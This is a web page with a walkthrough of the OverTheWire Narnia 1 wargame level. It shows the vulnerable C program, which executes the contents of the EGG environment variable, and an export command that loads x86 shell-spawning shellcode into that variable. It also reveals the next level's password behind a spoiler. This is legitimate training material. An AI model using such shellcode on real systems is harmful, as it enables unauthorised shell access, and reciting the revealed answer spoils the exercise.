<!DOCTYPE html><html><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width"/><meta name="next-head-count" content="2"/><link rel="preload" href="/over-the-wire/_next/static/css/86b7aba7af294b94.css" as="style"/><link rel="stylesheet" href="/over-the-wire/_next/static/css/86b7aba7af294b94.css" data-n-g=""/><link rel="preload" href="/over-the-wire/_next/static/css/21a6889b2154d675.css" as="style"/><link rel="stylesheet" href="/over-the-wire/_next/static/css/21a6889b2154d675.css" data-n-p=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/over-the-wire/_next/static/chunks/polyfills-5cd94c89d3acac5f.js"></script><script src="/over-the-wire/_next/static/chunks/webpack-f6318ba5529f7f5c.js" defer=""></script><script src="/over-the-wire/_next/static/chunks/framework-81da43a8dcd978d9.js" defer=""></script><script src="/over-the-wire/_next/static/chunks/main-00ca3f3974f0a67a.js" defer=""></script><script src="/over-the-wire/_next/static/chunks/pages/_app-4def5050ef33c1d2.js" defer=""></script><script src="/over-the-wire/_next/static/chunks/369-eeb2b79f75cc27b6.js" defer=""></script><script src="/over-the-wire/_next/static/chunks/pages/narnia/narnia1-1d2216f6e92db8cf.js" defer=""></script><script src="/over-the-wire/_next/static/JcUVksAhJ9Snvllfe1ZDW/_buildManifest.js" defer=""></script><script src="/over-the-wire/_next/static/JcUVksAhJ9Snvllfe1ZDW/_ssgManifest.js" defer=""></script><script src="/over-the-wire/_next/static/JcUVksAhJ9Snvllfe1ZDW/_middlewareManifest.js" defer=""></script></head><body><div id="__next"><nav class="Nav_navBar__ioQlk"><ul class="Nav_navItems__n_3aD"><li class="Nav_navLink__4k_2G"><a href="/over-the-wire">Home</a></li><li class="Nav_navLink__4k_2G"><a href="/over-the-wire/bandit">Bandit</a></li><li class="Nav_navLink__4k_2G"><a href="/over-the-wire/natas">Natas</a></li><li class="Nav_navLink__4k_2G"><a href="/over-the-wire/leviathan">Leviathan</a></li><li class="Nav_navLink__4k_2G"><a href="/over-the-wire/narnia">Narnia</a></li><li class="Nav_navLink__4k_2G"><a href="/over-the-wire/cipher">Cipher</a></li></ul></nav><div class="MainContainer_mainContainer__0FIFy"><div><h1>Narnia 1</h1><section><h2>Experience</h2><p>Starting this level, we again start by looking at the source code.</p><div class="CodeBlock_CodeBlock___IBBd"><pre style="color:#f8f8f2;background:#282a36;text-shadow:0 1px rgba(0, 0, 0, 0.3);font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;border-radius:0.3em"><code class="language-c" style="color:#f8f8f2;background:none;text-shadow:0 1px rgba(0, 0, 0, 0.3);font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#8be9fd">int<!-- --></span><span> <!-- --></span><span class="token" style="color:#f1fa8c">main<!-- --></span><span class="token" style="color:#f8f8f2">(<!-- --></span><span class="token" style="color:#f8f8f2">)<!-- --></span><span class="token" style="color:#f8f8f2">{<!-- --></span><span>
<!-- --></span><span></span><span class="token" style="color:#8be9fd">int<!-- --></span><span> <!-- --></span><span class="token" style="color:#f8f8f2">(<!-- --></span><span class="token" style="color:#f8f8f2">*<!-- --></span><span>ret<!-- --></span><span class="token" style="color:#f8f8f2">)<!-- --></span><span class="token" style="color:#f8f8f2">(<!-- --></span><span class="token" style="color:#f8f8f2">)<!-- --></span><span class="token" style="color:#f8f8f2">;<!-- --></span><span>
<!-- --></span>
<!-- --><span></span><span class="token" style="color:#8be9fd">if<!-- --></span><span class="token" style="color:#f8f8f2">(<!-- --></span><span class="token" style="color:#f1fa8c">getenv<!-- --></span><span class="token" style="color:#f8f8f2">(<!-- --></span><span class="token" style="color:#50fa7b">&quot;EGG&quot;<!-- --></span><span class="token" style="color:#f8f8f2">)<!-- --></span><span class="token" style="color:#f8f8f2">==<!-- --></span><span class="token" style="color:#ff79c6">NULL<!-- --></span><span class="token" style="color:#f8f8f2">)<!-- --></span><span class="token" style="color:#f8f8f2">{<!-- --></span><span>
<!-- --></span><span>  <!-- --></span><span class="token" style="color:#f1fa8c">printf<!-- --></span><span class="token" style="color:#f8f8f2">(<!-- --></span><span>&quot;Give me something to execute at the env<!-- --></span><span class="token" style="color:#f8f8f2">-<!-- --></span><span>variable EGG
<!-- --></span><span>&quot;<!-- --></span><span class="token" style="color:#f8f8f2">)<!-- --></span><span class="token" style="color:#f8f8f2">;<!-- --></span><span>
<!-- --></span><span>  <!-- --></span><span class="token" style="color:#f1fa8c">exit<!-- --></span><span class="token" style="color:#f8f8f2">(<!-- --></span><span class="token" style="color:#bd93f9">1<!-- --></span><span class="token" style="color:#f8f8f2">)<!-- --></span><span class="token" style="color:#f8f8f2">;<!-- --></span><span>
<!-- --></span><span></span><span class="token" style="color:#f8f8f2">}<!-- --></span><span>
<!-- --></span>
<!-- --><span></span><span class="token" style="color:#f1fa8c">printf<!-- --></span><span class="token" style="color:#f8f8f2">(<!-- --></span><span>&quot;Trying to execute EGG<!-- --></span><span class="token" style="color:#f8f8f2">!<!-- --></span><span>
<!-- --></span><span>&quot;<!-- --></span><span class="token" style="color:#f8f8f2">)<!-- --></span><span class="token" style="color:#f8f8f2">;<!-- --></span><span>
<!-- --></span><span>ret <!-- --></span><span class="token" style="color:#f8f8f2">=<!-- --></span><span> <!-- --></span><span class="token" style="color:#f1fa8c">getenv<!-- --></span><span class="token" style="color:#f8f8f2">(<!-- --></span><span class="token" style="color:#50fa7b">&quot;EGG&quot;<!-- --></span><span class="token" style="color:#f8f8f2">)<!-- --></span><span class="token" style="color:#f8f8f2">;<!-- --></span><span>
<!-- --></span><span></span><span class="token" style="color:#f1fa8c">ret<!-- --></span><span class="token" style="color:#f8f8f2">(<!-- --></span><span class="token" style="color:#f8f8f2">)<!-- --></span><span class="token" style="color:#f8f8f2">;<!-- --></span><span>
<!-- --></span>
<!-- --><span></span><span class="token" style="color:#8be9fd">return<!-- --></span><span> <!-- --></span><span class="token" style="color:#bd93f9">0<!-- --></span><span class="token" style="color:#f8f8f2">;<!-- --></span><span>
<!-- --></span><span></span><span class="token" style="color:#f8f8f2">}<!-- --></span></code></pre></div><p>We may observe several interesting thing, first a declaration of a pointer called <!-- --><code>ret</code> which points to a function. There is also a usage of <!-- --><code>getenv</code> which gets an environment variable, which here seems to be called <!-- --><em>EGG</em>. It then sets the function pointer to whatever is inside the EGG environment varialbe and then executes it. So, clearly, we must insert some type of program into the EGG environment variable to obtain the password for Narnia 2.<!-- --></p><p>I could understand so far that we must set the environment variable to something executable, however, I did not know how to proceed. Searching setting environment variable vulnerabilities led to a <!-- --><a href="https://owasp.org/www-community/attacks/Buffer_Overflow_via_Environment_Variables">page in owasp.org</a>.<!-- --></p></section><div class="CodeBlock_CodeBlock___IBBd"><pre style="color:#f8f8f2;background:#282a36;text-shadow:0 1px rgba(0, 0, 0, 0.3);font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;border-radius:0.3em"><code class="language-shell" style="color:#f8f8f2;background:none;text-shadow:0 1px rgba(0, 0, 0, 0.3);font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#f1fa8c">export<!-- --></span><span> <!-- --></span><span class="token assign-left" style="color:#f8f8f2">EGG<!-- --></span><span class="token" style="color:#f8f8f2">=<!-- --></span><span class="token" style="color:#f8f8f2">$(<!-- --></span><span class="token" style="color:#f8f8f2">python -c <!-- --></span><span class="token" style="color:#50fa7b">&#x27;print(&quot;\x31\xc9\xf7\xe1\x51\xbf\xd0\xd0\x8c\x97\xbe\xd0\x9d\x96\x91\xf7\xd7\xf7\xd6\x57\x56\x89\xe3\xb0\x0b\xcd\x80&quot;)&#x27;<!-- --></span><span class="token" style="color:#f8f8f2">)<!-- --></span></code></pre></div><section><h2>Key</h2><div class="SpoilerKey_codeBlock__KWl0d"><div class="SpoilerKey_spoilerToggler__HCeWZ"><button>Click to Reveal</button></div><div class="SpoilerKey_spoilerContainer__O76It"><div class="SpoilerKey_spoiler__YWx_s "><pre style="color:#f8f8f2;background:#282a36;text-shadow:0 1px rgba(0, 0, 0, 0.3);font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:0;overflow:auto;border-radius:0.3em"><code style="color:#f8f8f2;background:none;text-shadow:0 1px rgba(0, 0, 0, 0.3);font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span>nairiepecu<!-- --></span></code></pre></div></div></div></section><div class="PageNav_pageNav__NXqbT"><div><a title="Previous page" class="PageNav_navButton__yHhmO" href="/over-the-wire/narnia/narnia0">◀</a></div><div><a title="Next page" class="PageNav_navButton__yHhmO" href="/over-the-wire/narnia/narnia2">▶</a></div></div></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{}},"page":"/narnia/narnia1","query":{},"buildId":"JcUVksAhJ9Snvllfe1ZDW","assetPrefix":"/over-the-wire","nextExport":true,"autoExport":true,"isFallback":false,"scriptLoader":[]}</script></body></html>